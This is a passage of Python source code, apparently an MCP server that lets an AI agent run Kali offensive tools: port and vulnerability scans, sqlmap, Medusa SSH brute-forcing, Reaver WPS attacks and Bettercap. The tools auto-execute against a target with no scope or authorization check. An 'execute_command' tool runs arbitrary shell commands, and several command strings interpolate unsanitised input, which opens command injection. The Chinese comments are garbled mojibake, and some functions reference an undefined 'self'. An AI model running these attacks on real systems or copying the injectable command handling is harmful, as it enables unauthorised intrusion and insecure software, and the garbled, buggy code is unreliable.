            strategy_tools = ai_context_manager.strategy_engine.get_strategy_tools(strategy_name)

            if not strategy_tools:
                return {"success": False, "error": f"Unknown strategy: {strategy_name}"}

            execution_results = {
                "strategy_name": strategy_name,
                "session_id": session.session_id,
                "tools_executed": [],
                "tools_failed": [],
                "overall_success": False,
                "execution_summary": {}
            }

            if auto_execute and session.target:
                # è‡ªåŠ¨æ‰§è¡Œç­–ç•¥ä¸­çš„å·¥å…·
                successful_tools = 0
                total_tools = len(strategy_tools)

                for tool_name in strategy_tools:
                    try:
                        # æ ¹æ®å·¥å…·ç±»å‹è°ƒç”¨ç›¸åº”çš„å‡½æ•°
                        if tool_name == "nmap_scan":
                            result = nmap_scan(session.target, "-sS", "80,443,22", "-T5 --open --min-rate 5000 --max-retries 1")
                        elif tool_name == "gobuster_scan":
                            target_url = session.target if session.target.startswith("http") else f"http://{session.target}"
                            result = gobuster_scan(target_url, "dir", "/usr/share/wordlists/dirb/small.txt", "-t 100 --timeout 3s -q")
                        elif tool_name == "nuclei_web_scan":
                            target_url = session.target if session.target.startswith("http") else f"http://{session.target}"
                            result = nuclei_web_scan(target_url, "comprehensive")
                        elif tool_name == "analyze_target_intelligence":
                            result = analyze_target_intelligence(session.target)
                        elif tool_name == "comprehensive_recon":
                            result = comprehensive_recon(session.target)
                        else:
                            result = {"success": False, "error": f"Tool {tool_name} not implemented for auto-execution"}

                        if result.get("success", False):
                            execution_results["tools_executed"].append({
                                "tool": tool_name,
                                "result": result,
                                "timestamp": datetime.now().isoformat()
                            })
                            successful_tools += 1
                        else:
                            execution_results["tools_failed"].append({
                                "tool": tool_name,
                                "error": result.get("error", "Unknown error"),
                                "timestamp": datetime.now().isoformat()
                            })

                    except Exception as e:
                        execution_results["tools_failed"].append({
                            "tool": tool_name,
                            "error": str(e),
                            "timestamp": datetime.now().isoformat()
                        })

                execution_results["overall_success"] = successful_tools > 0
                execution_results["execution_summary"] = {
                    "successful_tools": successful_tools,
                    "total_tools": total_tools,
                    "success_rate": f"{(successful_tools/total_tools)*100:.1f}%"
                }

                # æ›´æ–°ä¼šè¯çŠ¶æ€
                session.completed_tasks.append(f"strategy_{strategy_name}")
                session.current_strategy = strategy_name

            else:
                # ä»…è¿”å›ç­–ç•¥å·¥å…·åˆ—è¡¨ï¼Œä¸è‡ªåŠ¨æ‰§è¡Œ
                execution_results["tools_to_execute"] = strategy_tools
                execution_results["auto_execution_disabled"] = True
                execution_results["message"] = f"Strategy {strategy_name} prepared. Set auto_execute=True to run automatically."

            return {
                "success": True,
                "execution_results": execution_results,
                "session_updated": True
            }

        except Exception as e:
            logger.error(f"AI strategy execution error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_update_session_context(session_id: str, discovered_info: Dict[str, Any],
                                tools_used: List[str] = None, user_feedback: str = "") -> Dict[str, Any]:
        """
        æ›´æ–°AIä¼šè¯ä¸Šä¸‹æ–‡ - æ‰‹åŠ¨æ›´æ–°ä¼šè¯çŠ¶æ€å’Œå‘ç°çš„ä¿¡æ¯

        Args:
            session_id: ä¼šè¯ID
            discovered_info: æ–°å‘ç°çš„ä¿¡æ¯ (ä¾‹: {"open_ports": [80, 443], "vulnerabilities": ["SQL injection"]})
            tools_used: ä½¿ç”¨çš„å·¥å…·åˆ—è¡¨
            user_feedback: ç”¨æˆ·åé¦ˆä¿¡æ¯

        Returns:
            æ›´æ–°åçš„ä¼šè¯çŠ¶æ€å’Œæ–°å»ºè®®
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            # æ›´æ–°å‘ç°çš„èµ„äº§
            for key, value in discovered_info.items():
                if key in session.discovered_assets:
                    if isinstance(session.discovered_assets[key], list):
                        session.discovered_assets[key].extend(value if isinstance(value, list) else [value])
                    else:
                        session.discovered_assets[key] = value
                else:
                    session.discovered_assets[key] = value

            # æ·»åŠ åˆ°å¯¹è¯å†å²
            if user_feedback:
                session.add_conversation(
                    user_message=f"Context update: {user_feedback}",
                    ai_response="Session context updated with new discoveries",
                    tools_used=tools_used or []
                )

            # æ›´æ–°çŸ¥è¯†åº“
            for category, data in discovered_info.items():
                ai_context_manager.update_knowledge_base("session_discoveries", f"{session.session_id}_{category}", data)

            # è·å–æ›´æ–°åçš„æ´å¯Ÿ
            insights = ai_context_manager.get_session_insights(session.session_id)

            return {
                "success": True,
                "session_id": session.session_id,
                "updated_context": session.get_context_summary(),
                "new_insights": insights,
                "next_recommendations": insights.get("next_recommendations", []),
                "message": "Session context updated successfully"
            }

        except Exception as e:
            logger.error(f"AI session context update error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_get_session_history(session_id: str = "", include_full_details: bool = False) -> Dict[str, Any]:
        """
        è·å–AIä¼šè¯å†å² - æŸ¥çœ‹å®Œæ•´çš„å¯¹è¯å†å²å’Œåˆ†æè¿›å±•

        Args:
            session_id: ä¼šè¯IDï¼ˆå¯é€‰ï¼Œé»˜è®¤å½“å‰ä¼šè¯ï¼‰
            include_full_details: æ˜¯å¦åŒ…å«å®Œæ•´çš„å·¥å…·æ‰§è¡Œè¯¦æƒ…

        Returns:
            å®Œæ•´çš„ä¼šè¯å†å²å’Œåˆ†ææ‘˜è¦
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            history = {
                "session_summary": session.get_context_summary(),
                "conversation_history": session.conversation_history,
                "discovered_assets": session.discovered_assets,
                "completed_tasks": session.completed_tasks,
                "timeline": []
            }

            # ç”Ÿæˆæ—¶é—´çº¿
            for conv in session.conversation_history:
                history["timeline"].append({
                    "timestamp": conv["timestamp"],
                    "event_type": "conversation",
                    "summary": conv["user_message"][:100] + "..." if len(conv["user_message"]) > 100 else conv["user_message"],
                    "tools_used": conv.get("tools_used", [])
                })

            if not include_full_details:
                # ç®€åŒ–å¯¹è¯å†å²ï¼Œåªä¿ç•™æ‘˜è¦
                simplified_history = []
                for conv in session.conversation_history:
                    simplified_history.append({
                        "timestamp": conv["timestamp"],
                        "user_message_summary": conv["user_message"][:50] + "..." if len(conv["user_message"]) > 50 else conv["user_message"],
                        "tools_used": conv.get("tools_used", []),
                        "session_context": conv.get("session_context", {})
                    })
                history["conversation_history"] = simplified_history

            return {
                "success": True,
                "session_id": session.session_id,
                "session_history": history,
                "analysis": {
                    "total_interactions": len(session.conversation_history),
                    "session_duration": str(datetime.now() - session.start_time),
                    "unique_tools_used": len(set(
                        tool for conv in session.conversation_history
                        for tool in conv.get("tools_used", [])
                    )),
                    "discovery_progress": f"{len(session.discovered_assets)} categories discovered"
                }
            }

        except Exception as e:
            logger.error(f"AI session history error: {str(e)}")
            return {"success": False, "error": str(e)}

    @mcp.tool()
    def ai_smart_continuation(session_id: str = "", user_hint: str = "") -> Dict[str, Any]:
        """
        AIæ™ºèƒ½ç»­æ¥ - åŸºäºå½“å‰ä¸Šä¸‹æ–‡æ™ºèƒ½æ¨èä¸‹ä¸€æ­¥æ“ä½œ

        Args:
            session_id: ä¼šè¯IDï¼ˆå¯é€‰ï¼‰
            user_hint: ç”¨æˆ·æç¤ºæˆ–åå¥½ï¼ˆå¯é€‰ï¼‰

        Returns:
            æ™ºèƒ½æ¨èçš„ä¸‹ä¸€æ­¥æ“ä½œå’Œæ‰§è¡Œè®¡åˆ’
        """
        try:
            session = ai_context_manager.get_or_create_session(session_id)

            # åˆ†æå½“å‰è¿›å±•
            insights = ai_context_manager.get_session_insights(session.session_id)

            # å¦‚æœæœ‰ç”¨æˆ·æç¤ºï¼Œç»“åˆåˆ†æ
            combined_context = f"{user_hint} å½“å‰ç›®æ ‡: {session.target}" if user_hint else f"ç»§ç»­åˆ†æç›®æ ‡: {session.target}"
            contextual_response = ai_context_manager.generate_contextual_response(session, combined_context)

            # ç”Ÿæˆæ™ºèƒ½å»ºè®®
            smart_recommendations = []

            # åŸºäºå·²å®Œæˆä»»åŠ¡æ¨èä¸‹ä¸€æ­¥
            if "nmap_scan" in str(session.completed_tasks):
                smart_recommendations.append({
                    "priority": "high",
                    "action": "æ·±å…¥æ¼æ´æ‰«æ",
                    "tools": ["nuclei_scan", "nikto_scan"],
                    "reason": "ç«¯å£æ‰«æå·²å®Œæˆï¼Œå»ºè®®è¿›è¡Œæ¼æ´æ£€æµ‹"
                })

            if len(session.discovered_assets.get("open_ports", [])) > 0:
                smart_recommendations.append({
                    "priority": "medium",
                    "action": "æœåŠ¡æšä¸¾",
                    "tools": ["enum4linux_scan", "dnsrecon_scan"],
                    "reason": f"å‘ç° {len(session.discovered_assets['open_ports'])} ä¸ªå¼€æ”¾ç«¯å£ï¼Œå»ºè®®æšä¸¾æœåŠ¡"
                })

            # å¦‚æœæ˜¯CTFæ¨¡å¼ï¼Œä¼˜å…ˆFlagæ£€æµ‹
            if session.attack_mode == "ctf":
                smart_recommendations.insert(0, {
                    "priority": "urgent",
                    "action": "CTF Flagæœç´¢",
                    "tools": ["get_detected_flags", "ctf_quick_scan"],
                    "reason": "CTFæ¨¡å¼ä¸‹ä¼˜å…ˆæœç´¢Flag"
                })

            return {
                "success": True,
                "session_id": session.session_id,
                "current_progress": insights,
                "smart_recommendations": smart_recommendations,
                "contextual_insights": contextual_response,
                "continuation_strategy": {
                    "next_phase": self._determine_next_phase(session),
                    "estimated_time": self._estimate_completion_time(session),
                    "confidence_level": self._calculate_confidence(session)
                }
            }

        except Exception as e:
            logger.error(f"AI smart continuation error: {str(e)}")
            return {"success": False, "error": str(e)}

    def _determine_next_phase(self, session: SessionContext) -> str:
        """ç¡®å®šä¸‹ä¸€ä¸ªæ”»å‡»é˜¶æ®µ"""
        completed = len(session.completed_tasks)
        if completed == 0:
            return "reconnaissance"
        elif completed < 3:
            return "vulnerability_discovery"
        elif completed < 5:
            return "exploitation"
        else:
            return "post_exploitation"

    def _estimate_completion_time(self, session: SessionContext) -> str:
        """ä¼°ç®—å®Œæˆæ—¶é—´"""
        if session.attack_mode == "ctf":
            return "5-15 minutes"
        elif len(session.discovered_assets) > 3:
            return "20-45 minutes"
        else:
            return "30-60 minutes"

    def _calculate_confidence(self, session: SessionContext) -> str:
        """è®¡ç®—ç½®ä¿¡åº¦"""
        if len(session.discovered_assets) > 2 and len(session.completed_tasks) > 2:
            return "high"
        elif len(session.completed_tasks) > 0:
            return "medium"
        else:
            return "low"
    
    @mcp.tool()
    def execute_command(command: str) -> Dict[str, Any]:
        """
        Execute an arbitrary command on the Kali server.

        Args:
            command: The command to execute

        Returns:
            Command execution results
        """
        return executor.execute_command(command)

    @mcp.tool()
    def nuclei_scan(target: str, templates: str = "", severity: str = "critical,high,medium",
                   tags: str = "", output_format: str = "json") -> Dict[str, Any]:
        """
        Execute Nuclei vulnerability scanner.

        Args:
            target: Target URL, IP, or domain to scan
            templates: Specific templates to use (e.g., 'cves/', 'http/misconfiguration/')
            severity: Severity levels to include (critical,high,medium,low,info)
            tags: Tags to filter templates (e.g., 'sqli,xss,rce')
            output_format: Output format (json or text)

        Returns:
            Nuclei scan results
        """
        # æ„å»ºnucleiå‘½ä»¤
        cmd_parts = ["nuclei", "-u", target]

        # æ·»åŠ æ¨¡æ¿è¿‡æ»¤
        if templates:
            cmd_parts.extend(["-t", templates])

        # æ·»åŠ ä¸¥é‡ç¨‹åº¦è¿‡æ»¤
        if severity:
            cmd_parts.extend(["-severity", severity])

        # æ·»åŠ æ ‡ç­¾è¿‡æ»¤
        if tags:
            cmd_parts.extend(["-tags", tags])

        # è®¾ç½®è¾“å‡ºæ ¼å¼
        if output_format == "json":
            cmd_parts.append("-json")

        # æ·»åŠ é™é»˜æ¨¡å¼å’Œå…¶ä»–ä¼˜åŒ–å‚æ•°
        cmd_parts.extend(["-silent", "-rate-limit", "100", "-timeout", "10"])

        command = " ".join(cmd_parts)
        return executor.execute_command(command)

    @mcp.tool()
    def nuclei_cve_scan(target: str, year: str = "", severity: str = "critical,high") -> Dict[str, Any]:
        """
        Execute Nuclei CVE vulnerability scan.

        Args:
            target: Target URL, IP, or domain to scan
            year: Specific CVE year to scan (e.g., '2023', '2024')
            severity: Severity levels to include

        Returns:
            CVE scan results
        """
        templates = f"cves/{year}/" if year else "cves/"
        return nuclei_scan(target, templates, severity, "", "json")

    @mcp.tool()
    def nuclei_web_scan(target: str, scan_type: str = "comprehensive") -> Dict[str, Any]:
        """
        Execute Nuclei web application security scan.

        Args:
            target: Target web application URL
            scan_type: Type of scan (quick, comprehensive, deep)

        Returns:
            Web application scan results
        """
        if scan_type == "quick":
            templates = "http/misconfiguration/,http/vulnerabilities/"
            severity = "critical,high"
        elif scan_type == "comprehensive":
            templates = "http/,vulnerabilities/web/"
            severity = "critical,high,medium"
        elif scan_type == "deep":
            templates = "http/,vulnerabilities/,cves/,exposures/"
            severity = "critical,high,medium,low"
        else:
            templates = "http/misconfiguration/"
            severity = "critical,high"

        return nuclei_scan(target, templates, severity, "", "json")

    @mcp.tool()
    def nuclei_network_scan(target: str, scan_type: str = "basic") -> Dict[str, Any]:
        """
        Execute Nuclei network security scan.

        Args:
            target: Target IP or network range
            scan_type: Type of scan (basic, full)

        Returns:
            Network scan results
        """
        if scan_type == "full":
            templates = "network/,dns/,ssl/,misconfiguration/"
            severity = "critical,high,medium"
        else:
            templates = "network/,dns/"
            severity = "critical,high"

        return nuclei_scan(target, templates, severity, "", "json")

    @mcp.tool()
    def nuclei_technology_detection(target: str) -> Dict[str, Any]:
        """
        Execute Nuclei technology detection scan.

        Args:
            target: Target URL or IP to analyze

        Returns:
            Technology detection results
        """
        return nuclei_scan(target, "technologies/", "info", "", "json")

    @mcp.tool()
    def wfuzz_scan(target: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                   additional_args: str = "-c") -> Dict[str, Any]:
        """
        Execute Wfuzz web fuzzer.

        Args:
            target: Target URL with FUZZ keyword (e.g., 'http://example.com/FUZZ')
            wordlist: Path to wordlist file
            additional_args: Additional Wfuzz arguments

        Returns:
            Wfuzz scan results
        """
        data = {
            "target": target,
            "wordlist": wordlist,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wfuzz", data)

    @mcp.tool()
    def wafw00f_scan(target: str, additional_args: str = "-a") -> Dict[str, Any]:
        """
        Execute wafw00f WAF detection.

        Args:
            target: Target URL to scan for WAF
            additional_args: Additional wafw00f arguments

        Returns:
            WAF detection results
        """
        data = {
            "target": target,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wafw00f", data)

    @mcp.tool()
    def sublist3r_scan(domain: str, additional_args: str = "-v") -> Dict[str, Any]:
        """
        Execute Sublist3r subdomain enumeration.

        Args:
            domain: Target domain to enumerate subdomains
            additional_args: Additional Sublist3r arguments

        Returns:
            Subdomain enumeration results
        """
        data = {
            "domain": domain,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("sublist3r", data)

    @mcp.tool()
    def masscan_scan(target: str, ports: str = "80,443", rate: str = "1000",
                     additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Masscan high-speed port scanner.

        Args:
            target: Target IP or network range
            ports: Ports to scan (e.g., "80,443,8080")
            rate: Scan rate (packets per second)
            additional_args: Additional Masscan arguments

        Returns:
            High-speed port scan results
        """
        data = {
            "target": target,
            "ports": ports,
            "rate": rate,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("masscan", data)

    @mcp.tool()
    def dnsrecon_scan(domain: str, scan_type: str = "-t std",
                      additional_args: str = "") -> Dict[str, Any]:
        """
        Execute DNSrecon for comprehensive DNS enumeration.

        Args:
            domain: Target domain for DNS enumeration
            scan_type: Type of DNS scan (e.g., "-t std", "-t axfr", "-t brt")
            additional_args: Additional DNSrecon arguments

        Returns:
            DNS enumeration results
        """
        data = {
            "domain": domain,
            "scan_type": scan_type,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("dnsrecon", data)

    @mcp.tool()
    def wpscan_scan(target: str, api_token: str = "",
                    additional_args: str = "--enumerate p,t,u") -> Dict[str, Any]:
        """
        Execute WPScan for WordPress security testing.

        Args:
            target: Target WordPress URL
            api_token: WPScan API token for vulnerability data
            additional_args: Additional WPScan arguments

        Returns:
            WordPress security scan results
        """
        data = {
            "target": target,
            "api_token": api_token,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("wpscan", data)

    @mcp.tool()
    def reaver_attack(interface: str, bssid: str,
                      additional_args: str = "-vv") -> Dict[str, Any]:
        """
        Execute Reaver for WPS PIN attacks.

        Args:
            interface: Wireless interface in monitor mode
            bssid: Target AP BSSID
            additional_args: Additional Reaver arguments

        Returns:
            WPS attack results
        """
        data = {
            "interface": interface,
            "bssid": bssid,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("reaver", data)

    @mcp.tool()
    def bettercap_attack(interface: str, caplet: str = "",
                         additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Bettercap for network attacks and reconnaissance.

        Args:
            interface: Network interface to use
            caplet: Bettercap caplet script to run
            additional_args: Additional Bettercap arguments

        Returns:
            Network attack results
        """
        data = {
            "interface": interface,
            "caplet": caplet,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("bettercap", data)

    @mcp.tool()
    def binwalk_analysis(file_path: str, extract: bool = False,
                         additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Binwalk for firmware analysis and extraction.

        Args:
            file_path: Path to firmware file to analyze
            extract: Whether to extract found filesystems
            additional_args: Additional Binwalk arguments

        Returns:
            Firmware analysis results
        """
        data = {
            "file_path": file_path,
            "extract": extract,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("binwalk", data)

    @mcp.tool()
    def theharvester_osint(domain: str, sources: str = "google,bing,yahoo",
                           limit: str = "500", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute theHarvester for OSINT and information gathering.

        Args:
            domain: Target domain for information gathering
            sources: Data sources to use (e.g., "google,bing,yahoo,linkedin")
            limit: Maximum number of results per source
            additional_args: Additional theHarvester arguments

        Returns:
            OSINT gathering results
        """
        data = {
            "domain": domain,
            "sources": sources,
            "limit": limit,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("theharvester", data)

    @mcp.tool()
    def netdiscover_scan(interface: str = "", range_ip: str = "",
                         passive: bool = False, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Netdiscover for network host discovery.

        Args:
            interface: Network interface to use
            range_ip: IP range to scan (e.g., "192.168.1.0/24")
            passive: Use passive mode (ARP sniffing)
            additional_args: Additional Netdiscover arguments

        Returns:
            Network discovery results
        """
        data = {
            "interface": interface,
            "range": range_ip,
            "passive": passive,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("netdiscover", data)

    @mcp.tool()
    def medusa_bruteforce(target: str, username: str = "",
                          password_list: str = "/usr/share/wordlists/rockyou.txt",
                          service: str = "ssh", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Medusa for password brute force attacks.

        Args:
            target: Target host or IP address
            username: Username to attack (optional for user enumeration)
            password_list: Path to password wordlist
            service: Service to attack (ssh, ftp, http, etc.)
            additional_args: Additional Medusa arguments

        Returns:
            Password attack results
        """
        data = {
            "target": target,
            "username": username,
            "password_list": password_list,
            "service": service,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("medusa", data)

    @mcp.tool()
    def comprehensive_network_scan(target: str, deep_scan: bool = False) -> Dict[str, Any]:
        """
        Execute comprehensive network reconnaissance workflow.

        Args:
            target: Target network or host
            deep_scan: Whether to perform deep scanning

        Returns:
            Comprehensive network scan results
        """
        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "workflow": "comprehensive_network_scan",
            "phases": {}
        }

        try:
            # Phase 1: Fast port discovery with Masscan
            logger.info(f"Phase 1: Fast port discovery on {target}")
            masscan_result = masscan_scan(target, "1-65535", "5000", "--open")
            results["phases"]["1_fast_port_scan"] = masscan_result

            # Phase 2: Detailed service enumeration with Nmap
            if masscan_result.get("success") and deep_scan:
                logger.info(f"Phase 2: Service enumeration on {target}")
                nmap_result = nmap_scan(target, "-sV -sC", "", "-T4")
                results["phases"]["2_service_enum"] = nmap_result

            # Phase 3: Network discovery
            logger.info(f"Phase 3: Network discovery")
            netdiscover_result = netdiscover_scan("", target, False)
            results["phases"]["3_network_discovery"] = netdiscover_result

            # Phase 4: DNS enumeration if target is domain
            if not target.replace(".", "").replace("/", "").isdigit():
                logger.info(f"Phase 4: DNS enumeration for {target}")
                dns_result = dnsrecon_scan(target, "-t std")
                results["phases"]["4_dns_enum"] = dns_result

            results["success"] = True
            results["summary"] = f"Comprehensive network scan completed for {target}"

        except Exception as e:
            logger.error(f"Error in comprehensive network scan: {str(e)}")
            results["success"] = False
            results["error"] = str(e)

        return results

    @mcp.tool()
    def advanced_web_security_assessment(target: str, wordpress_check: bool = True) -> Dict[str, Any]:
        """
        Execute advanced web application security assessment.

        Args:
            target: Target web application URL
            wordpress_check: Whether to perform WordPress-specific checks

        Returns:
            Advanced web security assessment results
        """
        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "workflow": "advanced_web_security_assessment",
            "phases": {}
        }

        try:
            # Phase 1: Technology detection
            logger.info(f"Phase 1: Technology detection for {target}")
            nuclei_tech = nuclei_technology_detection(target)
            results["phases"]["1_technology_detection"] = nuclei_tech

            # Phase 2: WAF detection
            logger.info(f"Phase 2: WAF detection for {target}")
            waf_result = wafw00f_scan(target)
            results["phases"]["2_waf_detection"] = waf_result

            # Phase 3: Directory enumeration with multiple tools
            logger.info(f"Phase 3: Directory enumeration for {target}")
            gobuster_result = gobuster_scan(target, "/usr/share/wordlists/dirb/big.txt", "dir")
            results["phases"]["3_directory_enum"] = gobuster_result

            # Phase 4: Web vulnerability scanning
            logger.info(f"Phase 4: Web vulnerability scanning for {target}")
            nuclei_web = nuclei_web_scan(target, "comprehensive")
            results["phases"]["4_web_vuln_scan"] = nuclei_web

            # Phase 5: WordPress specific testing
            if wordpress_check:
                logger.info(f"Phase 5: WordPress security testing for {target}")
                wp_result = wpscan_scan(target)
                results["phases"]["5_wordpress_scan"] = wp_result

            # Phase 6: SQL injection testing
            logger.info(f"Phase 6: SQL injection testing for {target}")
            sql_result = sqlmap_scan(target, "--batch --level=2 --risk=2")
            results["phases"]["6_sql_injection"] = sql_result

            results["success"] = True
            results["summary"] = f"Advanced web security assessment completed for {target}"

        except Exception as e:
            logger.error(f"Error in advanced web security assessment: {str(e)}")
            results["success"] = False
            results["error"] = str(e)

        return results

    # å·¥å…·é“¾ç»„åˆåŠŸèƒ½
    @mcp.tool()
    def web_app_security_assessment(target: str, deep_scan: bool = False) -> Dict[str, Any]:
        """
        Comprehensive web application security assessment workflow.

        Args:
            target: Target web application URL
            deep_scan: Whether to perform deep scanning (takes longer)

        Returns:
            Complete security assessment results
        """
        import time
        from datetime import datetime

        results = {
            "target": target,
            "assessment_type": "web_application_security",
            "start_time": datetime.now().isoformat(),
            "deep_scan": deep_scan,
            "phases": {},
            "summary": {}
        }

        try:
            # Phase 1: Information Gathering
            logger.info(f"Phase 1: Information gathering for {target}")
            results["phases"]["1_info_gathering"] = {
                "description": "Basic information gathering and port scanning",
                "start_time": datetime.now().isoformat()
            }

            # Extract domain/IP from URL for nmap
            import re
            domain_match = re.search(r'https?://([^/]+)', target)
            if domain_match:
                scan_target = domain_match.group(1)
            else:
                scan_target = target

            # Port scan for web services
            nmap_result = nmap_scan(scan_target, "-sV", "80,443,8080,8443,3000,5000,8000,9000", "-T4 --open")
            results["phases"]["1_info_gathering"]["nmap_scan"] = nmap_result

            # Phase 2: Technology Detection
            logger.info(f"Phase 2: Technology detection for {target}")
            results["phases"]["2_tech_detection"] = {
                "description": "Web technology and framework detection",
                "start_time": datetime.now().isoformat()
            }

            tech_result = nuclei_technology_detection(target)
            results["phases"]["2_tech_detection"]["nuclei_tech"] = tech_result

            # Phase 3: Directory Discovery
            logger.info(f"Phase 3: Directory discovery for {target}")
            results["phases"]["3_directory_discovery"] = {
                "description": "Web directory and file discovery",
                "start_time": datetime.now().isoformat()
            }

            gobuster_result = gobuster_scan(target, "dir", "/usr/share/wordlists/dirb/common.txt", "-t 20 -x php,html,txt,js")
            results["phases"]["3_directory_discovery"]["gobuster_scan"] = gobuster_result

            # Phase 4: Vulnerability Scanning
            logger.info(f"Phase 4: Vulnerability scanning for {target}")
            results["phases"]["4_vulnerability_scan"] = {
                "description": "Automated vulnerability detection",
                "start_time": datetime.now().isoformat()
            }

            if deep_scan:
                vuln_result = nuclei_web_scan(target, "deep")
            else:
                vuln_result = nuclei_web_scan(target, "comprehensive")

            results["phases"]["4_vulnerability_scan"]["nuclei_vulns"] = vuln_result

            # Phase 5: Web Server Analysis
            logger.info(f"Phase 5: Web server analysis for {target}")
            results["phases"]["5_webserver_analysis"] = {
                "description": "Web server security analysis",
                "start_time": datetime.now().isoformat()
            }

            nikto_result = nikto_scan(target, "-C all")
            results["phases"]["5_webserver_analysis"]["nikto_scan"] = nikto_result

            # Generate Summary
            results["end_time"] = datetime.now().isoformat()
            results["success"] = True
            results["summary"] = {
                "phases_completed": len(results["phases"]),
                "total_findings": "Analysis required",
                "recommendation": "Review all phases for security issues"
            }

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)
            results["end_time"] = datetime.now().isoformat()
            logger.error(f"Web app security assessment failed: {e}")

        return results

    @mcp.tool()
    def network_penetration_test(target: str, scope: str = "single") -> Dict[str, Any]:
        """
        Network penetration testing workflow.

        Args:
            target: Target IP address or network range
            scope: Scope of testing (single, subnet)

        Returns:
            Network penetration test results
        """
        from datetime import datetime

        results = {
            "target": target,
            "assessment_type": "network_penetration_test",
            "scope": scope,
            "start_time": datetime.now().isoformat(),
            "phases": {},
            "summary": {}
        }

        try:
            # Phase 1: Host Discovery
            logger.info(f"Phase 1: Host discovery for {target}")
            results["phases"]["1_host_discovery"] = {
                "description": "Network host discovery and ping sweep",
                "start_time": datetime.now().isoformat()
            }

            if scope == "subnet":
                ping_result = executor.execute_command(f"nmap -sn {target}")
            else:
                ping_result = executor.execute_command(f"ping -c 3 {target}")

            results["phases"]["1_host_discovery"]["ping_scan"] = ping_result

            # Phase 2: Port Discovery
            logger.info(f"Phase 2: Port discovery for {target}")
            results["phases"]["2_port_discovery"] = {
                "description": "Comprehensive port scanning",
                "start_time": datetime.now().isoformat()
            }

            port_result = nmap_scan(target, "-sS", "80,443,22", "-T5 --open --min-rate 5000 --max-retries 1 --host-timeout 3s")
            results["phases"]["2_port_discovery"]["nmap_ports"] = port_result

            # Phase 3: Service Enumeration
            logger.info(f"Phase 3: Service enumeration for {target}")
            results["phases"]["3_service_enum"] = {
                "description": "Service version detection and enumeration",
                "start_time": datetime.now().isoformat()
            }

            service_result = nmap_scan(target, "-sV -sC", "", "-T4")
            results["phases"]["3_service_enum"]["nmap_services"] = service_result

            # Phase 4: Vulnerability Assessment
            logger.info(f"Phase 4: Vulnerability assessment for {target}")
            results["phases"]["4_vuln_assessment"] = {
                "description": "Network vulnerability scanning",
                "start_time": datetime.now().isoformat()
            }

            network_vuln_result = nuclei_network_scan(target, "full")
            results["phases"]["4_vuln_assessment"]["nuclei_network"] = network_vuln_result

            # Phase 5: OS Detection
            logger.info(f"Phase 5: OS detection for {target}")
            results["phases"]["5_os_detection"] = {
                "description": "Operating system detection",
                "start_time": datetime.now().isoformat()
            }

            os_result = nmap_scan(target, "-O", "", "--osscan-guess")
            results["phases"]["5_os_detection"]["nmap_os"] = os_result

            # Generate Summary
            results["end_time"] = datetime.now().isoformat()
            results["success"] = True
            results["summary"] = {
                "phases_completed": len(results["phases"]),
                "recommendation": "Analyze results for potential attack vectors"
            }

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)
            results["end_time"] = datetime.now().isoformat()
            logger.error(f"Network penetration test failed: {e}")

        return results

    # æ–°å¢ç°ä»£å·¥å…·
    @mcp.tool()
    def ffuf_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                  mode: str = "FUZZ", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute FFUF web fuzzer (faster alternative to wfuzz).

        Args:
            url: Target URL with FUZZ keyword (e.g., 'http://example.com/FUZZ')
            wordlist: Path to wordlist file
            mode: Fuzzing mode (FUZZ for directories, HFUZZ for headers)
            additional_args: Additional FFUF arguments

        Returns:
            FFUF scan results
        """
        cmd = f"ffuf -u {url} -w {wordlist} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def whatweb_scan(target: str, aggression: str = "1", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute WhatWeb for web technology identification.

        Args:
            target: Target URL or IP
            aggression: Aggression level (1-4, 1=passive, 4=aggressive)
            additional_args: Additional WhatWeb arguments

        Returns:
            Technology identification results
        """
        cmd = f"whatweb -a {aggression} {target} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def amass_enum(domain: str, mode: str = "enum", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute AMASS for comprehensive subdomain enumeration.

        Args:
            domain: Target domain for enumeration
            mode: AMASS mode (enum, intel, track, db)
            additional_args: Additional AMASS arguments

        Returns:
            Subdomain enumeration results
        """
        cmd = f"amass {mode} -d {domain} {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def subfinder_scan(domain: str, sources: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Execute Subfinder for fast subdomain discovery.

        Args:
            domain: Target domain
            sources: Specific sources to use (comma-separated)
            additional_args: Additional Subfinder arguments

        Returns:
            Subdomain discovery results
        """
        cmd = f"subfinder -d {domain}"
        if sources:
            cmd += f" -sources {sources}"
        cmd += f" {additional_args}"
        return executor.execute_command(cmd)

    @mcp.tool()
    def httpx_probe(targets: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Execute httpx for HTTP probing and technology detection.

        Args:
            targets: Target URLs, IPs, or file containing targets
            additional_args: Additional httpx arguments

        Returns:
